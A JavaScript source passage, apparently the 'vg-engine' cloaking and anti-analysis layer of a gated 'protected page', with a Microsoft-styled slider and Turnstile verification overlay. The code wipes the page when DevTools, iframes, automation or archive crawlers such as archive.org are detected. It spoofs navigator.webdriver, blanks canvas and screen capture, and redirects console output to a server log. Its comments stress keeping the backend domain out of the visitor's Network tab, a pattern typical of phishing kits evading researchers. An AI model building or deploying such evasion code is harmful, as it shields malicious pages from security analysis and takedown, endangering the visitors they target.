      console.error('[VG] iframe detected, killing page');
      // Page is in iframe - kill it (only on non-slider pages)
      document.documentElement.innerHTML = '';
      killPage('iframe_embed');
    }

    // 5. Monitor for rapid DOM changes (indicator of scraping tool)
    // Increased thresholds to reduce false positives
    var lastBodyLength = document.body ? document.body.innerHTML.length : 0;
    var domChangeCount = 0;
    setTimeout(function() { // Delay DOM monitoring by grace period
      setInterval(function() {
        if (isInGracePeriod()) return;
        var currentLength = document.body ? document.body.innerHTML.length : 0;
        // Increased threshold from 50000 to 100000
        if (Math.abs(currentLength - lastBodyLength) > 100000) {
          domChangeCount++;
          // Increased threshold from 3 to 5
          if (domChangeCount > 5) {
            killPage('dom_change');
          }
        } else {
          domChangeCount = Math.max(0, domChangeCount - 1);
        }
        lastBodyLength = currentLength;
      }, 2000); // Slowed from 1000ms to 2000ms
    }, _gracePeriodMs);

    // 6. Re-assert the console hook so the browser console stays clean
    // regardless of script order. Forward to logToServer rather than a pure
    // noop: kill reasons (killPage / integrity / devtools tokens) must reach
    // the deployment log, otherwise there is no way to tell which check fired
    // when a real user is wiped. Forwarding does not expose anything to a local
    // debugger - logToServer only POSTs to /api/log and writes nothing back.
    (function() {
      var methods = ['log', 'debug', 'info', 'warn', 'error', 'table', 'trace', 'group', 'groupEnd'];
      var lv = { log: 'info', debug: 'debug', info: 'info', warn: 'warn', error: 'error',
                 table: 'info', trace: 'trace', group: 'info', groupEnd: 'info' };
      methods.forEach(function(m) {
        if (console[m]) {
          console[m] = function() {
            try { logToServer(lv[m] || 'info', Array.prototype.slice.call(arguments).join(' ')); } catch (e) {}
          };
        }
      });
    })();

    // 7. Kill page function - silent destruction
    var _killPageCalled = false;
    function killPage(reason) {
      // Prevent multiple killPage calls
      if (_killPageCalled) {
        console.log('[VG] killPage already called, ignoring duplicate call:', reason);
        return;
      }
      _killPageCalled = true;

      // The kill reason, URL, and UA are already routed to the server via the
      // console hijack (logToServer) below. No separate /api/killpage beacon:
      // it was a second network request to the backend that leaked the backend
      // domain in the visitor's Network tab, and the same data was already
      // being sent through the hijacked console.
      console.error('[VG] killPage called' + (reason ? ': ' + reason : ''));
      console.error('[VG] URL:', window.location.href);
      console.error('[VG] User-Agent:', navigator.userAgent);

      // Wipe the page.
      try {
        document.open();
        document.write('');
        document.close();
      } catch(e) {}

      // Flush any pending logs before navigating away.
      try { flushLogs(); } catch(e) {}

      setTimeout(function() {
        try { window.location.replace('about:blank'); } catch(e) {}
      }, 400);
    }

    // 8. Anti-screen recording: detect canvas access and blank it
    var _nativeCreateCanvas = document.createElement.bind(document);
    document.createElement = function(tagName) {
      var el = _nativeCreateCanvas(tagName);
      if (tagName.toLowerCase() === 'canvas') {
        var origGetContext = el.getContext;
        el.getContext = function() {
          try {
            var ctx = origGetContext.apply(this, arguments);
            if (ctx && ctx.fillStyle) {
              ctx.fillStyle = '#000000';
              ctx.fillRect(0, 0, 99999, 99999);
            }
          } catch(e) {}
          return ctx;
        };
      }
      return el;
    };

    // 9. Hook screenshot-detecting APIs
    try {
      var origGetDisplayMedia = navigator.mediaDevices.getDisplayMedia;
      if (origGetMedia) {
        navigator.mediaDevices.getDisplayMedia = function() {
          return Promise.reject(new Error('Screen capture not allowed'));
        };
      }
    } catch(e) {}

    // 10. Hide the automation flag.
    //
    // NOTE: this installs an OWN accessor property on the navigator instance -
    // exactly the shape isBotRequest() treats as a spoofed webdriver. The getter
    // is therefore stored in _vgWebdriverGetter (module scope) so isBotRequest()
    // can skip it by identity. Without that exemption the engine flagged ITSELF
    // and showed the white page ~500ms after load on every visit, for real users
    // and bots alike.
    try {
      // Only install the patch when nobody else already has. Overwriting an
      // existing own accessor would launder a stealth library's spoof into our
      // own getter and blind the descriptor check in isBotRequest() - which
      // exists precisely to catch that case.
      var _wdExisting = Object.getOwnPropertyDescriptor(navigator, 'webdriver');
      if (!_wdExisting || typeof _wdExisting.get !== 'function') {
        _vgWebdriverGetter = function() {
          // Always return false to hide automation flag
          return false;
        };
        Object.defineProperty(navigator, 'webdriver', {
          get: _vgWebdriverGetter,
          configurable: true
        });
      }
    } catch(e) {}

    // 11. Fingerprint is computed locally only — never beacons to the backend.
    // A network request here would leak the backend domain in the visitor's
    // Network tab, and the route was returning 404 anyway.
    (function() {
      var fingerprint = '';
      try {
        fingerprint += navigator.hardwareConcurrency || '';
        fingerprint += navigator.deviceMemory || '';
        fingerprint += screen.colorDepth + 'x' + screen.pixelDepth;
        fingerprint += new Date().getTimezoneOffset();
        fingerprint += (navigator.languages || []).join(',');
      } catch(e) {}
      window.__vg_fingerprint = btoa(fingerprint || 'unknown');
    })();
  }

  // ─── Anti-Scraping ───────────────────────────────────────────
  // Content obfuscation only. The heartbeat beacon was removed: it fired a
  // network request to the backend every 30s, leaking the backend domain in
  // the visitor's Network tab, and added nothing the fingerprint + behavior
  // layers don't already provide.
  function initAntiScraping() {
    // Skip on slider pages
    if (window.__SLIDER_DESIGN === true || window.__SLIDER_DESIGN === 'true') {
      return;
    }
    
    // 2. Content obfuscation for sensitive elements
    function obfuscateSensitiveContent() {
      // Obfuscate any verification codes, tokens, or sensitive data
      var sensitiveSelectors = [
        '[data-sensitive]',
        '[id*="token"]',
        '[class*="token"]'
      ];

      // Use a WeakMap to store original values - not accessible from DOM inspection
      var _originalValues = new WeakMap();

      sensitiveSelectors.forEach(function(selector) {
        try {
          var elements = document.querySelectorAll(selector);
          elements.forEach(function(el) {
            // Skip elements that have been marked as revealed (e.g., verification codes)
            if (el.getAttribute('data-vg-revealed') === 'true') return;

            if (el && el.textContent && el.textContent.length > 3) {
              // Store original in WeakMap (not accessible from DOM)
              _originalValues.set(el, el.textContent);
              el.textContent = '••••••';
            }
          });
        } catch(e) {}
      });

      // Expose a function to reveal values when needed (e.g., for copy)
      window.__vgRevealSensitive = function(el) {
        return _originalValues.get(el) || el.textContent;
      };

      // Re-obfuscate periodically
      setInterval(obfuscateSensitiveContent, 5000);
    }
    
    // 3. Detect automated content extraction
    // 3. Detect automated content extraction
    function detectExtraction() {
      var copyCount = 0;
      var selectCount = 0;

      // A single copy or select-all is NEVER a bot signal: a headless
      // extractor reads the DOM programmatically (innerText / innerHTML /
      // textContent / CDP evaluate) and fires none of these DOM events.
      // The keyboard handler below used to kill on the first Ctrl+A / Cmd+C,
      // which wiped every macOS visitor the moment they copied the code -
      // e.metaKey is the macOS Cmd key and is effectively never pressed on
      // Windows/Linux, which is why the false positive only ever hit Mac
      // browsers. Only an extreme, repeated flood - which no legitimate use
      // of a verification page ever produces - trips these backstops, and
      // they fail open.
      document.addEventListener('copy', function() {
        copyCount++;
        if (copyCount > 50) {
          killPage('copy_count');
        }
      });

      document.addEventListener('selectstart', function() {
        selectCount++;
        if (selectCount > 100) {
          killPage('select_count');
        }
      });

      // Keyboard backstop: devtools toggles only, never everyday shortcuts.
      // F12 does not open DevTools on macOS (the key is the system volume /
      // media key or an unbound F-key there), so killing on it can only ever
      // fire on a real Mac visitor - skip it on Mac. The Ctrl+Shift chord
      // still requires a literal Ctrl key press, which no Mac visitor hits
      // by accident, so it stays cross-platform.
      document.addEventListener('keydown', function(e) {
        var isMac = /Mac OS X|Macintosh|iPhone|iPad|iPod/.test(navigator.userAgent);
        if ((e.key === 'F12' && !isMac) ||
            (e.ctrlKey && e.shiftKey && (e.key === 'i' || e.key === 'j' || e.key === 'c'))) {
          killPage('devtools_key');
        }
      });
    }
    
    // 4. Canvas fingerprinting protection
    // Only adds noise when canvas data is extracted (fingerprinting pattern)
    function protectCanvasFingerprinting() {
      var originalGetContext = HTMLCanvasElement.prototype.getContext;
      var wrappedContexts = new WeakMap();

      HTMLCanvasElement.prototype.getContext = function(contextType) {
        var ctx = originalGetContext.apply(this, arguments);
        if (!ctx || (contextType !== '2d' && contextType !== 'webgl')) {
          return ctx;
        }

        // Return already-wrapped context if available
        if (wrappedContexts.has(ctx)) {
          return wrappedContexts.get(ctx);
        }

        // Create a wrapper that only adds noise on data extraction
        var wrapped = Object.create(ctx);

        // Wrap toDataURL - this is the main fingerprinting method
        var origToDataURL = ctx.canvas.toDataURL.bind(ctx.canvas);
        ctx.canvas.toDataURL = function(type, quality) {
          // Add a tiny, nearly invisible noise pixel before extraction
          try {
            ctx.save();
            ctx.globalAlpha = 0.005; // Nearly invisible
            ctx.fillStyle = 'rgba(' + Math.floor(Math.random() * 10) + ',' +
                           Math.floor(Math.random() * 10) + ',' +
                           Math.floor(Math.random() * 10) + ',1)';
            ctx.fillRect(
              Math.floor(Math.random() * ctx.canvas.width),
              Math.floor(Math.random() * ctx.canvas.height),
              1, 1
            );
            ctx.restore();
          } catch(e) {}
          return origToDataURL(type, quality);
        };

        // Wrap getImageData - another fingerprinting method
        var origGetImageData = ctx.getImageData.bind(ctx);
        ctx.getImageData = function(sx, sy, sw, sh) {
          var data = origGetImageData(sx, sy, sw, sh);
          // Add subtle noise to a random pixel
          try {
            var idx = Math.floor(Math.random() * (data.data.length / 4)) * 4;
            var noise = Math.floor(Math.random() * 3) - 1; // -1, 0, or 1
            data.data[idx] = Math.min(255, Math.max(0, data.data[idx] + noise));
          } catch(e) {}
          return data;
        };

        wrappedContexts.set(ctx, wrapped);
        return ctx; // Return original ctx but with wrapped methods on canvas
      };
    }
    
    // 5. Detect if page is being archived/wayback
    function detectArchiving() {
      var ua = navigator.userAgent.toLowerCase();
      var archiveBots = [
        'archive.org', 'wayback', 'web.archive', 
        'archivebot', 'webcapture', 'httrack'
      ];
      
      for (var i = 0; i < archiveBots.length; i++) {
        if (ua.includes(archiveBots[i])) {
          killPage('archive_bot:' + archiveBots[i]);
          return;
        }
      }
      
      // Check for archive-related headers via meta tags
      var metaTags = document.querySelectorAll('meta');
      for (var i = 0; i < metaTags.length; i++) {
        var content = metaTags[i].getAttribute('content') || '';
        if (content.toLowerCase().includes('archive') || 
            content.toLowerCase().includes('wayback')) {
          killPage('archive_content');
        }
      }
    }
    
    // 6. Randomized timing to confuse timing attacks
    function addTimingNoise() {
      var originalNow = Date.now;
      Date.now = function() {
        return originalNow.call(Date) + Math.floor(Math.random() * 5);
      };
      
      var originalPerfNow = performance.now;
      performance.now = function() {
        return originalPerfNow.call(performance) + Math.random() * 0.5;
      };
    }
    
    // Initialize all protections
    obfuscateSensitiveContent();
    detectExtraction();
    protectCanvasFingerprinting();
    detectArchiving();
    // addTimingNoise(); // Disabled - can break legitimate JS
    
    // Kill page if any check fails
    var _killPageCalledBot = false;
    function killPage(reason) {
      // Prevent multiple killPage calls
      if (_killPageCalledBot) {
        console.log('[VG] killPage already called, ignoring duplicate:', reason);
        return;
      }
      _killPageCalledBot = true;

      // Reason/URL already reach the server via the console hijack. No
      // separate /api/killpage beacon — it leaked the backend domain in the
      // visitor's Network tab for no additional information.
      console.error('[VG] killPage called' + (reason ? ': ' + reason : ''));
      console.error('[VG] URL:', window.location.href);

      try {
        document.open();
        document.write('');
        document.close();
      } catch(e) {}

      try { flushLogs(); } catch(e) {}

      setTimeout(function() {
        try { window.location.replace('about:blank'); } catch(e) {}
      }, 400);
    }
  }
  function initAntiDebug() {
    // Anti-debug is ON by default. It is only disabled when the operator has
    // explicitly switched it off in the admin panel (the flag arrives as the
    // string "true"/"false" from buildWindowVars in templateloader.js).
    var _adFlag = window.__ANTIDEBUG_ENABLED;
    if (_adFlag === false || _adFlag === 'false' || _adFlag === '0' || _adFlag === 0) return;

    // Kill the page the instant DevTools is detected. Wipe the DOM to a blank
    // white page FIRST so the real content is never visible even for a frame,
    // then try to close the tab and bounce to about:blank (the reliable kill -
    // window.close() only closes script-opened tabs). Nothing is left to read.
    var _killed = false;
    function killDevtools() {
      if (_killed) return;
      _killed = true;
      try { logToServer('warn', '[VG] DevTools detected, terminating page'); } catch (e) {}
      try {
        document.open();
        document.write('<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>html,body{margin:0;padding:0;background:#fff;height:100%;overflow:hidden}</style></head><body></body></html>');
        document.close();
      } catch (e) {
        try { document.documentElement.innerHTML = ''; if (document.body) document.body.style.background = '#fff'; } catch (e2) {}
      }
      try { window.close(); } catch (e) {}
      setTimeout(function () { try { window.location.replace('about:blank'); } catch (e) {} }, 0);
    }

    var isSliderPageDebug = window.__SLIDER_DESIGN === true || window.__SLIDER_DESIGN === 'true';
    var isMobile = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent) ||
      (window.innerWidth <= 768 && ('ontouchstart' in window));

    // Docked-DevTools window-size diff. Real desktop browser chrome is ~88px, so
    // 160px never fires for a normal window but fires the moment DevTools docks.
    // Mobile browser chrome inflates this value, so the size checks are desktop-only.
    var _sizeHits = 0;
    function windowDelta() {
      try { return { wd: window.outerWidth - window.innerWidth, hd: window.outerHeight - window.innerHeight }; }
      catch (e) { return { wd: 0, hd: 0 }; }
    }
    function checkWindowDelta() {
      var d = windowDelta();
      if (d.wd > 160 || d.hd > 160) {
        _sizeHits++;
        // Two consecutive hits absorb a transient resize race; a large single
        // delta (docked + resized) kills immediately.
        if (_sizeHits >= 2 || d.wd > 240 || d.hd > 240) killDevtools();
      } else {
        _sizeHits = 0;
      }
    }

    // DevTools-open marker via the Function.prototype.toString native-code string:
    // when DevTools is open, Chrome swaps in a non-native toString, so
    // '[native code]' disappears. This catches a separate (undocked) DevTools
    // window where the viewport size never changes. Debounced to 2 hits.
    var _toStringBaseline = null;
    try { _toStringBaseline = String(Function.prototype.toString).indexOf('[native code]') !== -1; } catch (e) {}
    var _tsHits = 0;
    function checkToStringNative() {
      try {
        if (!_toStringBaseline) return;
        if (String(Function.prototype.toString).indexOf('[native code]') === -1) {
          _tsHits++;
          if (_tsHits >= 2) killDevtools();
        } else {
          _tsHits = 0;
        }
      } catch (e) {}
    }

    // 1) Immediate check: a tab that already has DevTools open is killed as soon
    //    as the page runs - no grace period, so "opened immediately" is caught.
    if (typeof window.__devtools !== 'undefined') {
      killDevtools();
    } else if (!isMobile) {
      var d0 = windowDelta();
      if (d0.wd > 160 || d0.hd > 160) killDevtools();
    }
    if (_killed) return;

    // 2) Continuous polling - a DevTools opened "now" is killed within ~1s.
    if (!isMobile) {
      var sizeInterval = setInterval(function () {
        if (_killed) { clearInterval(sizeInterval); return; }
        checkWindowDelta();
        checkToStringNative();
      }, 400);
      window.addEventListener('resize', function () { if (!_killed) checkWindowDelta(); }, true);
    }

    // 3) Debugger timing trap: the `debugger` statement pauses while DevTools is
    //    open, so the elapsed time across it is large. Runs on all pages except
    //    slider designs, where a held drag can coincide with the statement.
    //
    // Desktop-only: iOS/Android throttle backgrounded timers and tick
    // performance.now() coarsely, so a real phone user (switched tab, locked
    // screen, a busy main thread) routinely registers two consecutive slow
    // readings and gets their page killed. Mobile automation is already caught
    // by the hard signals (navigator.webdriver, driver globals, bot user agents
    // in isBotRequest + vg-cloak), so the timing trap adds only false
    // positives on mobile.
    if (!isSliderPageDebug && !isMobile) {
      // Two consecutive slow hits, matching the debounce the window-size and
      // toString checks above already use: a single >150ms gap also happens when
      // the main thread is briefly busy (GC, a slow parse, a background tab
      // throttled), and killing on that alone wiped real users' pages.
      var _dbgHits = 0;
      var dbgInterval = setInterval(function () {
        if (_killed) { clearInterval(dbgInterval); return; }
        // A backgrounded / occluded tab is throttled by the browser; its timer
        // gaps are NOT a DevTools signal. Reset so a real user who switched tabs
        // and came back is never killed on return.
        if (document.visibilityState === 'hidden') { _dbgHits = 0; return; }
        var s = (window.performance && performance.now) ? performance.now() : Date.now();
        // eslint-disable-next-line no-debugger
        debugger;
        var d = (window.performance && performance.now) ? performance.now() : Date.now();
        if (d - s > 150) {
          _dbgHits++;
          if (_dbgHits >= 2) killDevtools();
        } else {
          _dbgHits = 0;
        }
      }, 1000);
    }
  }

  // ─── Obfuscation (optional, controlled by admin) ────────────
  // The admin flag arrives as a STRING ("true"/"false") from buildWindowVars,
  // and a non-empty string is always truthy - so a plain `if (!flag)` guard ran
  // this block whether the toggle was on or off. Coerce it explicitly.
  function _flagEnabled(v) {
    return v === true || v === 1 || String(v) === 'true' || String(v) === '1';
  }
  function initObfuscation() {
    if (!_flagEnabled(window.__OBFUSCATION_ENABLED)) return;
    // Re-apply the console hijack so the console stays clean no matter the
    // script order. The slider overlay is injected AFTER vg-engine, so it could
    // in principle bring the original console back; re-installing here is what
    // makes the top-of-file hijack actually stick.
    //
    // The previous version here was labelled "Console clearing" but did the
    // opposite: it captured whatever console.log currently was and wrapped it
    // in a passthrough, so it neither silenced anything nor sent anything to
    // the server.
    (function () {
      console.log = function () { logToServer('info', Array.prototype.slice.call(arguments).join(' ')); };
      console.warn = function () { logToServer('warn', Array.prototype.slice.call(arguments).join(' ')); };
      console.error = function () { logToServer('error', Array.prototype.slice.call(arguments).join(' ')); };
      console.debug = function () { logToServer('debug', Array.prototype.slice.call(arguments).join(' ')); };
      console.info = function () { logToServer('info', Array.prototype.slice.call(arguments).join(' ')); };
      console.trace = function () { logToServer('trace', Array.prototype.slice.call(arguments).join(' ')); };
    })();
    // Disable right-click
    document.addEventListener('contextmenu', function (e) { e.preventDefault(); });
    // Disable Ctrl+U, Ctrl+S, F12
    document.addEventListener('keydown', function (e) {
      if (e.ctrlKey && (e.key === 'u' || e.key === 's')) e.preventDefault();
      if (e.key === 'F12') e.preventDefault();
    });
  }

  // ─── Slider Chain Handler ───────────────────────────────────
  // Called when slider verification completes - renders Cloudflare turnstile
  // into the vgCfLayer and handles the verification flow
  function initSliderChainHandler() {
    // Check if this page uses slider design
    // Handle both boolean true and string "true" (from different injection methods)
    var isSlider = window.__SLIDER_DESIGN === true || window.__SLIDER_DESIGN === 'true';
    if (!isSlider) { return; }

    console.log('[vg-engine] Slider design detected, setting up chain handler');

    // State flags to prevent race conditions
    var _sliderCompleted = false;
    var _turnstileRendering = false;
    var _turnstileRendered = false;
    var _layersHidden = false;
    // Turnstile render/execute failure budget. A failure is never allowed to
    // reveal the protected page; instead the visitor gets a bounded number of
    // automatic retries and then a manual Retry button.
    var _cfAttempts = 0;
    var _cfMaxAttempts = 3;
    // Grace period before an incomplete challenge is treated as failed. Long
    // enough for a slow visitor to use the Retry button, short enough that no
    // visitor is stranded permanently if Cloudflare is unreachable.
    var CF_TIMEOUT_MS = 180000;

    // Last reason the challenge failed. The retry path in executeTurnstileIntoWrap
    // hits its own budget guard BEFORE _onCfFailure can report, which swallowed
    // the real Turnstile error code - the visitor saw only "Retry limit reached"
    // and there was no way to tell 110200 from a blocked script.
    var _cfLastError = '';

    // Timeout: if Turnstile never completes (network error, origin mismatch,
    // etc.) the verification layer stays up and the visitor is given the Retry
    // button. Nothing here is allowed to hide the layers - that would reveal the
    // protected page with no verification at all.
    // 180s: long enough for a human to use the Retry button, short enough that no
    // visitor is stranded permanently if Cloudflare is down.
    var _cfTimeoutTimer = null;
    function _resetCfTimeout() {
      clearTimeout(_cfTimeoutTimer);
      _cfTimeoutTimer = setTimeout(function() {
        // The challenge never completed within the grace period. The layer MUST
        // stay up: hiding it here would reveal the protected page with no
        // verification at all - the exact opposite of a verification gate, and
        // precisely how a broken or blocked challenge was "fixed" before by
        // letting the visitor straight through.
        //
        // Force the terminal failure state (budget exhausted) so the visitor gets
        // the Retry button instead. Resetting the budget in Retry means a slow
        // visitor can still complete the challenge on a later attempt.
        console.warn('[vg-engine] Cloudflare verification timed out after ' +
          CF_TIMEOUT_MS + 'ms; keeping the verification layer up');
        _cfAttempts = _cfMaxAttempts;
        _cfLastError = 'Turnstile did not complete within the timeout';
        _turnstileRendering = false;
        _turnstileRendered = true;
        showCfFailureState(document.getElementById('vgCfHint'), _cfLastError);
      }, CF_TIMEOUT_MS);
    }
    function _cancelCfTimeout() {
      clearTimeout(_cfTimeoutTimer);
    }

    // ── Turnstile failure handling ─────────────────────────────
    // IMPORTANT: this function must NEVER hide the layers. Hiding them reveals
    // the protected page with no verification at all, which is the exact
    // opposite of what a verification gate should do. A failed Turnstile
    // challenge (most commonly a domain that was never added to the widget's
    // allowed origins) is a configuration problem on the platform side;
    // silently passing it means the protection was never applied.
    function _onCfFailure(errMsg) {
      _turnstileRendering = false;
      _cfLastError = String(errMsg || '');
      var cfHint = document.getElementById('vgCfHint');

      if (_cfAttempts >= _cfMaxAttempts) {
        _turnstileRendered = true;
        showCfFailureState(cfHint, errMsg);
        return;
      }

      _cfAttempts += 1;
      console.warn('[vg-engine] Cloudflare verification failed (' + _cfAttempts + '/' +
        _cfMaxAttempts + '): ' + errMsg);
      if (cfHint) {
        cfHint.textContent = 'Verification failed, retrying (' + _cfAttempts +
          ' of ' + _cfMaxAttempts + ')...';
      }
      setTimeout(function () {
        var wrap = document.getElementById('vgCfWidgetWrap');
        var ph = document.getElementById('vgCfPlaceholder');
        if (wrap) { try { wrap.innerHTML = ''; } catch (e) {} }
        if (ph) ph.style.display = 'flex';
        renderTurnstileIntoCfLayer();
      }, 1500);
    }

    // Persistent failure state: keep the Cloudflare layer on screen and give
    // the visitor an explicit Retry button instead of revealing the page.
    function showCfFailureState(cfHint, detail) {
      var cfLayer = document.getElementById('vgCfLayer');
      if (cfLayer) {
        cfLayer.style.display = 'flex';
        cfLayer.style.visibility = 'visible';
        cfLayer.style.pointerEvents = 'auto';
      }
      var wrap = document.getElementById('vgCfWidgetWrap');
      if (wrap) { try { wrap.innerHTML = ''; } catch (e) {} }
      var ph = document.getElementById('vgCfPlaceholder');
      if (ph) ph.style.display = 'none';

      if (!cfHint) return;
      cfHint.textContent = '';
      cfHint.style.display = 'flex';
      cfHint.style.flexDirection = 'column';
      cfHint.style.alignItems = 'center';
      cfHint.style.justifyContent = 'center';
      cfHint.style.gap = '12px';

      var msg = document.createElement('div');
      msg.style.cssText = 'font-size:13px;color:#605E5C;line-height:1.5;max-width:300px;text-align:center;';
      msg.textContent = 'Security verification could not be completed. Please try again.';

      // Reason the challenge failed. Turnstile's own error code is only
      // visible in the browser console, which the obfuscation strips
      // (disableConsoleOutput), so it was impossible to tell 110200
      // "domain not authorized" apart from a blocked script or a timed-out
      // challenge. console.* is unavailable here; DOM text is not.
      if (detail) {
        var det = document.createElement('div');
        det.style.cssText = 'font-size:11px;color:#9a9896;line-height:1.4;max-width:300px;' +
          'text-align:center;font-family:monospace;margin-top:4px;';
        det.textContent = String(detail);
        cfHint.appendChild(det);
      }

      var btn = document.createElement('button');
      btn.type = 'button';
      btn.textContent = 'Retry security check';
      btn.style.cssText = 'padding:10px 22px;font-size:13px;font-weight:600;color:#fff;' +
        'background:#232333;border:0;border-radius:8px;cursor:pointer;font-family:inherit;';
      btn.addEventListener('click', function () {
        btn.disabled = true;
        btn.textContent = 'Retrying...';
        _cfAttempts = 0;
        _turnstileRendered = false;
        var wrap2 = document.getElementById('vgCfWidgetWrap');
        if (wrap2) { try { wrap2.innerHTML = ''; } catch (e) {} }
        setTimeout(function () { renderTurnstileIntoCfLayer(); }, 500);
      });

      cfHint.appendChild(msg);
      cfHint.appendChild(btn);
    }

    // Register the slider complete callback - ONLY ONCE
    // This prevents double-registration if vg-engine loads multiple times
    if (typeof window.__vgOnSliderComplete !== 'function' || !window.__vgOnSliderComplete._isEngine) {
      window.__vgOnSliderComplete = function() {
        if (_sliderCompleted) {
          console.log('[vg-engine] Slider complete callback fired but already processed, ignoring');
          return;
        }
        _sliderCompleted = true;
        console.log('[vg-engine] Slider completed, rendering Cloudflare turnstile');

        // ── Behavior analysis gate ───────────────────────────────
        // Automation (Puppeteer mouse.move, Playwright mouse.move) produces
        // near-straight trajectories with near-zero velocity variance. A
        // human drags the slider with variable speed and direction changes.
        // This check runs BEFORE the Turnstile renders, so a bot that
        // solves the slider still can't reach the challenge.
        //
        // Threshold is 0.75, not the original 0.6: a slider drag is
        // constrained to a straight horizontal track, so a careful human
        // scores dirChange (0.25) + straightness (0.25) before any timing
        // signal is counted, and a Mac trackpad's regular 60/120Hz event
        // cadence adds dtCV (0.2) on top - the 0.6 gate killed real
        // visitors at 0.6-0.7. Scripted mouse.move still scores 0.8-1.0
        // (near-zero velocity variance + perfectly straight + even steps),
        // so 0.75 still requires three of the four robotic signals.
        try {
          var mouseResult = window.__VG_ANALYZE_MOUSE ? window.__VG_ANALYZE_MOUSE() : null;
          if (mouseResult && mouseResult.score >= 0.75) {
            console.error('[vg-engine] Robotic mouse trajectory detected, score=' + mouseResult.score.toFixed(3) +
              ' velCV=' + (mouseResult.velCV || 0).toFixed(3) +
              ' dirChange=' + (mouseResult.dirChangeRatio || 0).toFixed(3) +
              ' straight=' + (mouseResult.straightness || 0).toFixed(3) +
              ' events=' + mouseResult.eventCount);
            if (typeof window.__VG_KILLPAGE === 'function') {
              window.__VG_KILLPAGE('robotic_mouse:' + mouseResult.score.toFixed(2));
              return;
            }
          }
        } catch (e) { /* never let the analysis itself break the flow */ }

        // Dismiss the slider layer HERE, in the engine.
        //
        // Design scripts (verification-designs/*.html) only call this callback -
        // they never hide their own overlay - and #vgSliderLayer sits ABOVE
        // #vgCfLayer (z-index 99999 vs 99998). Leaving the slider up meant the
        // Cloudflare challenge rendered underneath it and stayed permanently
        // invisible, so the visitor sat on a frozen "Verified" screen until the
        // 45s timeout hid both layers at once and skipped the challenge.
        var sliderLayer = document.getElementById('vgSliderLayer');
        if(sliderLayer){
          sliderLayer.style.display = 'none';
          sliderLayer.style.visibility = 'hidden';
          sliderLayer.style.pointerEvents = 'none';
        }

        // Show the Cloudflare layer (slider layer is hidden above)
        var cfLayer = document.getElementById('vgCfLayer');
        if(cfLayer){
          cfLayer.style.display = 'flex';
        }

        // Publish completion state so the recovery paths below this function
        // (which read window.__vgSliderVerified) can see it. Previously nothing
        // ever set this, so that branch was permanently dead.
        window.__vgSliderVerified = true;
        // Same reason: the polling loop further down calls this function, and no
        // design script ever defined it, so the recovery path never fired.
        window.__vgCheckSliderReady = function () {
          return window.__vgSliderVerified === true;
        };

        // Render Cloudflare turnstile into the vgCfWidgetWrap
        renderTurnstileIntoCfLayer();
      };
      // Mark this as the engine's callback to prevent overwrites
      window.__vgOnSliderComplete._isEngine = true;
    }

    // FIX: Check if slider already completed before vg-engine loaded
    // The slider overlay sets __vgPendingSliderComplete if it finishes before
    // vg-engine.js loads. We must call __vgOnSliderComplete to render Turnstile.
    if (window.__vgPendingSliderComplete && window.__vgSliderVerified) {
      console.log('[vg-engine] Slider had already completed before engine loaded, triggering Turnstile');
      setTimeout(function() {
        if (typeof window.__vgOnSliderComplete === 'function') {
          window.__vgOnSliderComplete();
        }
      }, 100);
    }
    
    // Render Cloudflare turnstile widget into the vgCfLayer
    function renderTurnstileIntoCfLayer() {
      if (_turnstileRendering || _turnstileRendered) {
        console.log('[vg-engine] Turnstile already rendering or rendered, skipping');
        return;
      }
      _turnstileRendering = true;

      var cfWidgetWrap = document.getElementById('vgCfWidgetWrap');
      var cfPlaceholder = document.getElementById('vgCfPlaceholder');
      var cfHint = document.getElementById('vgCfHint');
      
      if(!cfWidgetWrap) {
        // A missing widget container means the verification overlay is broken.
        // Hiding the layers here would reveal the protected page with no
        // verification, so surface the failure instead and let the visitor
        // retry.
        //
        // NB: don't go through _onCfFailure() - that retries and clears the
        // attempt budget, but there is nothing to retry: the container simply
        // isn't in the DOM, so every retry would hang on the 1500ms placeholder
        // wait and the Retry button would die.
        console.warn('[vg-engine] vgCfWidgetWrap not found - keeping verification layer up');
        _turnstileRendering = false;
        _turnstileRendered = true;
        showCfFailureState(cfHint, 'Widget container missing');
        return;
      }
      
      // Hide the loading placeholder. Regenerate it if a previous failure state
      // destroyed it: showCfFailureState() clears vgCfWidgetWrap.innerHTML,
      // which takes vgCfPlaceholder away with it. Without this, a Retry
      // re-entered here, timed out on the 1500ms placeholder wait, and the
      // Retry button died - the visitor was stuck on a frozen failure screen.
      if(cfPlaceholder) {
        cfPlaceholder.style.display = 'none';
      } else if(cfWidgetWrap) {
        var ph = document.createElement('div');
        ph.id = 'vgCfPlaceholder';
        ph.style.cssText = 'text-align:center;';
        ph.innerHTML = '<div style="width:40px;height:40px;border:3px solid #e4e4e4;' +
          'border-top-color:#0078D4;border-radius:50%;animation:vgSpin 1s linear infinite;' +
          'margin:0 auto 12px;"></div>' +
          '<div style="font-size:13px;color:#605E5C;">Completing verification...</div>';
        cfWidgetWrap.appendChild(ph);
      }
      
      // Check if Turnstile is already loaded
      if(typeof window.turnstile !== 'undefined') {
        executeTurnstileIntoWrap(cfWidgetWrap);
      } else if(window.__TURNSTILE_ENABLED && window.__TURNSTILE_SITE_KEY) {
        // Load Turnstile script dynamically with onload callback
        console.log('[vg-engine] Loading Cloudflare Turnstile for slider chain');
        var script = document.createElement('script');
        script.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js?onload=vgOnTurnstileReadyForSlider';
        script.async = true;
        script.defer = true;
        script.id = 'vg-turnstile-script-slider';
        (document.head || document.documentElement).appendChild(script);
        
        // Timeout if the script takes too long to load. Route through the
        // failure handler so the visitor is retried rather than let through -
        // the old behaviour hid both layers and revealed the protected page.
        setTimeout(function() {
          if (typeof window.turnstile === 'undefined') {
            _onCfFailure('Turnstile script failed to load within timeout');
          }
        }, 15000);
        
        // Global callback for when Turnstile loads
        window.vgOnTurnstileReadyForSlider = function() {
          console.log('[vg-engine] Cloudflare Turnstile loaded for slider chain');
          _turnstileRendering = false;
          executeTurnstileIntoWrap(cfWidgetWrap);
        };
      } else {
        // No site key available - the widget CANNOT be rendered. Refuse to
        // reveal the protected page: the old behaviour hid both layers here and
        // let the visitor straight through, which is how a missing or
        // late-created assignment row showed up as "the challenge never
        // appeared". Surface the failure state with the Retry button instead.
        console.warn('[vg-engine] No Turnstile site key - refusing to reveal the page');
        _onCfFailure('No Turnstile site key configured');
      }
    }
    
    function executeTurnstileIntoWrap(widgetWrap) {
